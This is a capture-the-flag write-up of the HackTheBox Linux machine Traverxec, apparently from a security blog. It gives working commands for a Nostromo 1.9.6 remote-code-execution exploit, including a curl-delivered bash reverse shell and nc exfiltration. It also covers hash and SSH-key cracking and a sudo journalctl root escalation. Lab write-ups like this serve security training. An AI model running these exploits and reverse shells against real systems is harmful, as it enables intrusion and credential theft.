---
title: HTB: Traverxec
url: https://0xdf.gitlab.io/2020/04/11/htb-traverxec.html
date: 2020-04-11T14:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-traverxec, hackthebox, ctf, nmap, nostromo, searchsploit, metasploit, htpasswd, hashcat, ssh, john, gtfobins, journalctrl, oscp-like-v2
---

![Traverxec](https://0xdfimages.gitlab.io/img/traverxec-cover.png)

Traverxec was a relatively easy box that involved enumerating and exploiting a less popular webserver, Nostromo. I’ll take advantage of a RCE vulnerability to get a shell on the host. I could only find a Metasploit script, but it was a simple HTTP request I could recreate with curl. Then I’ll pivot into the users private files based on his use of a web home directory on the server. To get root, I’ll exploit sudo used with journalctrl.

## Box Info

| Name | [Traverxec](https://hackthebox.com/machines/traverxec)  [Traverxec](https://hackthebox.com/machines/traverxec) [Play on HackTheBox](https://hackthebox.com/machines/traverxec) |
| --- | --- |
| Release Date | [16 Nov 2019](https://twitter.com/hackthebox_eu/status/1194894325181759488) |
| Retire Date | 11 Apr 2020 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Traverxec |
| Radar Graph | Radar chart for Traverxec |
| First Blood User | 00:26:49[x4nt0n x4nt0n](https://app.hackthebox.com/users/38547) |
| First Blood Root | 01:06:28[kolokokop kolokokop](https://app.hackthebox.com/users/91278) |
| Creator | [jkr jkr](https://app.hackthebox.com/users/77141) |

## Recon

### nmap

`nmap` shows to common ports open, HTTP (TCP 80) and SSH (TCP 22):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-22 07:12 EST
Nmap scan report for 10.10.10.165
Host is up (0.014s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
root@kali# nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-22 10:27 EST
Nmap scan report for 10.10.10.165
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.59 seconds

```

Based on the [OpenSSH version](https://packages.debian.org/search?keywords=openssh-server), this looks likely to be Debian Buster. I also see it’s not running Apache or NGINX, but nostromo. I’ll dig on that.

### Website - TCP 80

#### Site

The site is for a web designer:

![image-20191122103037723](https://0xdfimages.gitlab.io/img/image-20191122103037723.png)

#### Server Version

I noticed `nmap` reported the HTTP server as Nostromo. Looking at the HTTP headers, I see it as well:

```

HTTP/1.1 200 OK
Date: Fri, 22 Nov 2019 12:13:28 GMT
Server: nostromo 1.9.6
Connection: close
Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
Content-Length: 15674
Content-Type: text/html

```

## Shell as www-data

### Identify Vulnerability

`searchsploit` shows two potential Nostromo vulnerabilities:

```

root@kali# searchsploit nostromo
-------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                      |  Path
                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------- ----------------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit | exploits/multiple/remote/47573.rb
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Executio | exploits/linux/remote/35466.sh
-------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

There’s a Metasploit one (which I avoid), and a shell script. The shell script is an exploit for an older version. I’ll take a quick look with `searchsploit -x exploits/linux/remote/35466.sh`. It says that versions prior to 1.9.4 are affected, so not here. The way the exploit works is sending a POST to `/..%2f..%2f..%2fbin/sh`. That’s basic directory traversal, and using `%2f` (hex for `/`) must bypass filtering. And then whatever is the POST data is passed to `sh`. But that doesn’t work here.

Some googling reveals the [source for the MSF exploit](https://packetstormsecurity.com/files/155045/Nostromo-1.9.6-Directory-Traversal-Remote-Command-Execution.html) on PacketStorm. It targets up to 1.9.6, which is the version on Traverxec. Reading the source, I find the `execute_command` function:

```

  def execute_command(cmd, opts = {})
    send_request_cgi({
      'method'  => 'POST',
      'uri'     => normalize_uri(target_uri.path, '/.%0d./.%0d./.%0d./.%0d./bin/sh'),
      'headers' => {'Content-Length:' => '1'},
      'data'    => "echo\necho\n#{cmd} 2>&1"
      }
    )
  end

```

It’s doing the same thing as the previous exploit, only this time, instead of url encoding the `/` characters, there are extra `%0d` (or `\n` newlines) between the `.`s.

### Exploit POC

I’ll start playing around with `curl` and see if I can get it to work. I’ll start with the following command: `curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d "id | nc 10.10.14.6 443"`. The options are:
- `-s` - silence the progress bar and error messages
- `-X POST` - send a POST request
- `http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh` - The target, with the directory traversal to access `/bin/sh`
- `-d "id | nc 10.10.14.6 443"` - The command I want to run, which will send the results of `id` back to a listener on my box port 443.

When I run that, with `nc` listening on 443, I get results immediately:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.165.
Ncat: Connection from 10.10.10.165:52998.
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

Now that I can run commands, I’ll run a command to get a shell:

```

root@kali# curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'

```

That command just hangs, but on a fresh `nc` listener:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.165.
Ncat: Connection from 10.10.10.165:53000.
bash: cannot set terminal process group (458): Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Priv: www-data –> david

### Find SSH Key

After some cursory looks around, I decided to upload and run [LinEnum](https://github.com/rebootuser/LinEnum). One of the things that it pointed out was a `.htpasswd` file:

```

[-] htpasswd found - could contain passwords:
/var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/  

```

I pulled that back and started cracking it with `hashcat`:

```

root@kali# time hashcat -m 500 htpasswd /usr/share/wordlists/rockyou.txt --username --force
...[snip]...
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me    
...[snip]...

```

While in the `/var/nostromo/conf` directory, I started taking a look at the configuration file, `nhttpd.conf`:

```

www-data@traverxec:/var/nostromo/conf$ ls -a 
.  ..  .htpasswd  mimes  nhttpd.conf

www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www

```

The last two options jumped out as interesting. Looking at the [man page for nostromo](http://www.nazgul.ch/dev/nostromo_man.html), I see the section about HOMEDIRS:

> ```

> HOMEDIRS
>   To serve the home directories of your users via HTTP, enable the homedirs
>   option by defining the path in where the home directories are stored,
>   normally /home.  To access a users home directory enter a ~ in the URL
>   followed by the home directory name like in this example:
>
>         http://www.nazgul.ch/~hacki/
>
>   The content of the home directory is handled exactly the same way as a
>   directory in your document root.  If some users don't want that their
>   home directory can be accessed via HTTP, they shall remove the world
>   readable flag on their home directory and a caller will receive a 403
>   Forbidden response.  Also, if basic authentication is enabled, a user can
>   create an .htaccess file in his home directory and a caller will need to
>   authenticate.
>
>   You can restrict the access within the home directories to a single sub
>   directory by defining it via the homedirs_public option.
>
> ```

So `/homedirs /home` points `nostromo` to the home directories, and then in a users directory, the webroot will be `public_www`. So `http://10.10.10.165/~david` will be `/home/david/public_www`.

My first thought was to access this via the browser:

![image-20191122134727465](https://0xdfimages.gitlab.io/img/image-20191122134727465.png)

I could even use the traversal vulnerability to explore in david’s home directory. Tried a bunch of stuff:

| URL | Result | Notes |
| --- | --- | --- |
| `http://10.10.10.165/~david/.%0d./` | Empty Page | Likely exists, no permissions to read |
| `http://10.10.10.165/~david/.%0D./.ssh/` | Empty | Likely exists, no permissions to read |
| `http://10.10.10.165/~david/.%0D./0xdf/` | 404 Not Found | Doesn’t exist (as expected) |
| `http://10.10.10.165/~david/.%0D./user.txt` | 403 Forbidden | Exists, but no permissions to read |
| `http://10.10.10.165/~david/index.html` | Image Above | I have permissions to read in this dir |

The last test was where it occurred to me that www-data must be able read in this directory, `/home/david/public_www`. So I went back to my shell, and not only can I get into the directory, but there’s a folder there:

```

www-data@traverxec:/var/nostromo/conf$ cd /home/david/public_www
www-data@traverxec:/home/david/public_www$ ls            
index.html  protected-file-area 

```

Inside, there’s backup keys:

```

www-data@traverxec:/home/david/public_www$ cd protected-file-area/
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
backup-ssh-identity-files.tgz   

```

I’ll send that through `nc` back to my box. With `nc` listening on my host, I’ll send it back:

```

www-data@traverxec:/home/david/public_www/protected-file-area$ cat backup-ssh-identity-files.tgz | nc 10.10.14.6 443  

```

On my host:

```

root@kali# nc -lnvp 443 > backup-identity-files.tgz.b64 
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.165.
Ncat: Connection from 10.10.10.165:53004.

```

I could also grab the file over the webserver. If I `curl` the url, I get 401 unauthorized:

```

root@kali# curl 10.10.10.165/~david/protected-file-area/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>401 Unauthorized</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
</head>
<body>

<h1>401 Unauthorized</h1>

<hr>
<address>nostromo 1.9.6 at 10.10.10.165 Port 80</address>
</body>
</html>

```

I can add the username/password I cracked earlier, I can grab the file:

```

root@kali# wget http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz
--2019-11-22 14:30:35--  http://david:*password*@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz
Connecting to 10.10.10.165:80... connected.
HTTP request sent, awaiting response... 401 Unauthorized
Authentication selected: Basic realm="David's Protected File Area. Keep out!"
Reusing existing connection to 10.10.10.165:80.
HTTP request sent, awaiting response... 200 OK
Length: 1915 (1.9K) [application/x-tar]
Saving to: ‘backup-ssh-identity-files.tgz’

backup-ssh-identity-files.tgz         100%[======================================================================>]   1.87K  --.-KB/s    in 0s      

2019-11-22 14:30:35 (47.4 MB/s) - ‘backup-ssh-identity-files.tgz’ saved [1915/1915]

```

I can decompress that with `tar`, and I get a backup of the home directories with a private key:

```

root@kali# tar -zxvf backup-ssh-identity-files.tgz 
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
root@kali# head home/david/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec

```

### Crack the Key

Now I’ll use `ssh2john.py` and `john` to crack the password on the SSH key:

```

root@kali# /opt/john/run/ssh2john.py home/david/.ssh/id_rsa > id_rsa.john

root@kali# /opt/john/run/john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (home/david/.ssh/id_rsa)
1g 0:00:00:03 DONE (2019-11-22 13:20) 0.3289g/s 4717Kp/s 4717Kc/s 4717KC/s     1990..*7¡Vamos!
Session completed

```

I like to create a copy that’s not password protected for future use:

```

root@kali# openssl rsa -in home/david/.ssh/id_rsa -out ~/id_rsa_traverxec_david 
Enter pass phrase for home/david/.ssh/id_rsa:
writing RSA key

```

### Shell over SSH

Now I can connect over SSH as david:

```

root@kali# ssh -i ~/id_rsa_traverxec_david david@10.10.10.165
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Fri Nov 22 04:55:08 2019 from 10.10.14.59
david@traverxec:~$

```

And grab `user.txt`:

```

david@traverxec:~$ cat user.txt
7db0b484************************

```

## Priv: david –> root

### Enumeration

In david’s home directory, next to `user.txt`, there’s a `bin` directory:

```

david@traverxec:~$ ls
bin  public_www  user.txt

```

In it, there’s a script to get server stats:

```

david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh

david@traverxec:~/bin$ ./server-stats.sh 
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 

Load:  14:46:14 up 14:45,  2 users,  load average: 0.00, 0.00, 0.00
 
Open nhttpd sockets: 1
Files in the docroot: 117
 
Last 5 journal log lines:
-- Logs begin at Fri 2019-11-22 00:00:54 EST, end at Fri 2019-11-22 14:46:14 EST. --
Nov 22 11:45:02 traverxec sudo[1931]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Nov 22 11:45:02 traverxec sudo[1931]: www-data : command not allowed ; TTY=pts/1 ; PWD=/dev/shm ; USER=root ; COMMAND=list
Nov 22 11:45:03 traverxec crontab[2016]: (www-data) LIST (www-data)
Nov 22 13:06:56 traverxec nhttpd[2384]: /~david/../../../bin/sh sent a bad cgi header
Nov 22 13:07:14 traverxec nhttpd[2386]: /~david/../../../bin/sh sent a bad cgi header

```

If I look at the script, I can see it’s doing a handful of things:

```

#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 

```

The most interesting line is the last, which is a call with `sudo`. When I ran this script, it never prompted for my password, so I know david must be in the `/etc/sudoers` file as no password for that command.

I tried to view the `sudo` config with `sudo -l`, but it requires david’s password.

### Exploiting journalctrl

I’ll look up `journalctrl` on [gtfobins](https://gtfobins.github.io/gtfobins/journalctl/#sudo), and there is a `sudo` option. It’s quite short, simply saying:

> sudo journalctl
> !/bin/sh

The trick here is that `journalctrl` will output to stdout if it can fit onto the current page, but into `less` if it can’t. Since I’m running it with `-n 5`, that means only five lines come out, so I need to shrink my terminal to smaller than 5 lines, and I’ll get sent into `less`, still as root.

I’ll start with a small terminal, and run the command as I can as root:

![image-20191122145122610](https://0xdfimages.gitlab.io/img/image-20191122145122610.png)

When I hit enter, I’m in `less` (viewing lines 1-3):

![image-20191122145157286](https://0xdfimages.gitlab.io/img/image-20191122145157286.png)

Now I can just type `!/bin/bash`, and I’m at a root shell:

![image-20191122145238952](https://0xdfimages.gitlab.io/img/image-20191122145238952.png)

Now I can grab `root.txt`:

```

root@traverxec:~# cat root.txt
9aa36a6d************************

```